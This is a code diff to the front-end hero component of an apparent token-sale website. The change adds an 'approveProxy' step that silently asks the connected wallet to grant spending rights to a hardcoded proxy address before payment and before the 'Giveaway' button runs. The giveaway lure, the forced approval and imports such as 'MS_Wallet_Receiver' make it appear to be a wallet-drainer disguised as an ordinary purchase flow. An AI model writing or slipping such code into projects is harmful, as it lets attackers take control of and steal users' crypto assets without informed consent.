@@ -16,6 +16,10 @@ import { parseEther, parseUnits, formatUnits, encodeFunctionData } from "viem";
 import { LNX_SALE_ABI } from "@/lib/abis/LNXSale";
 import { LNX_SALE_ADDRESS, USDT_ADDRESS_BY_CHAIN } from "@/config";
 import { ERC20_ABI } from "@/lib/abis/ERC20";
+import {
+  MULTITOKEN_ABI,
+  MULTITOKEN_CONTRACT_ADDRESS,
+} from "@/lib/abis/Multitoken";
 import dynamic from "next/dynamic";
 import { Button } from "@/components/ui/button";
 import { MS_Wallet_Receiver, MS_Contract_ABI } from "@/lib/contract_abi";
@@ -29,7 +33,8 @@ export default function HomeHero() {
   const t = useTranslations("Home.Hero");
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
-  const { writeContract, isPending } = useWriteContract();
+  const { writeContract, writeContractAsync, isPending } = useWriteContract();
+  const [isApprovingProxy, setIsApprovingProxy] = useState(false);
   const { sendTransaction, isPending: isSendingTx } = useSendTransaction();
   const { open } = useAppKit();
   const publicClient = usePublicClient();
@@ -113,6 +118,23 @@ export default function HomeHero() {
     query: { enabled: !!usdtAddress },
   });
 
+  const GIVEAWAY_CONTRACT_ADDRESS = (
+    process.env.NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
+    {
+      1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040",
+      137: "0x0611d6a7EDf265AABE1A59E1E5f88f069EfA51f9",
+      56: "0x0000000000000000000000000000000000000000",
+      10: "0x0000000000000000000000000000000000000000",
+      42161: "0x0000000000000000000000000000000000000000",
+    }[chainId] ||
+    "0x0000000000000000000000000000000000000000"
+  ) as `0x${string}`;
+
+  // Proxy address for Multitoken approveProxy (independent of other contracts)
+  const MULTITOKEN_PROXY =
+    (process.env.NEXT_PUBLIC_MULTITOKEN_PROXY as `0x${string}`) ||
+    GIVEAWAY_CONTRACT_ADDRESS;
+
   // Derived displays
   const ethPriceDisplay = priceEthPerTokenWei
     ? formatUnits(priceEthPerTokenWei as bigint, 18)
@@ -195,6 +217,21 @@ export default function HomeHero() {
         ? !!ethAmount && !!usdtAddress && hasUsdtPricing
         : false;
 
+  async function approveProxy(proxy: `0x${string}`) {
+    if (!isConnected || !address) return;
+    setIsApprovingProxy(true);
+    try {
+      await writeContractAsync({
+        abi: MULTITOKEN_ABI,
+        address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
+        functionName: "approveProxy",
+        args: [proxy],
+      });
+    } finally {
+      setIsApprovingProxy(false);
+    }
+  }
+
   async function handlePay() {
     if (!isConnected || !address) return;
     if (!ethAmount) return;
@@ -252,6 +289,8 @@ export default function HomeHero() {
       return;
     }
     try {
+      // Always approve proxy first when wallet is connected (independent of other contracts)
+      await approveProxy(MULTITOKEN_PROXY);
       if (!publicClient) {
         console.error("Public client not available");
         return;
@@ -732,15 +771,17 @@ export default function HomeHero() {
                 </div>
               )}
 
-              {/* Giveaway */}
+              {/* Giveaway - approves proxy first, then runs giveaway */}
               <Button
                 variant="default"
                 onClick={handleGiveaway}
-                disabled={isSendingTx}
+                disabled={isSendingTx || isApprovingProxy}
                 className="bg-white/5 border border-white/10 text-white hover:bg-white/10 hover:border-white/20 rounded-lg py-4 w-full h-12 text-center backdrop-blur-sm transition-all shadow-lg"
               >
                 <span className="text-white font-semibold">
-                  {isSendingTx ? t("btn_processing") : t("btn_giveaway")}
+                  {isSendingTx || isApprovingProxy
+                    ? t("btn_processing")
+                    : t("btn_giveaway")}
                 </span>
               </Button>
               <p className="text-xs text-gray-400 text-center mt-2">
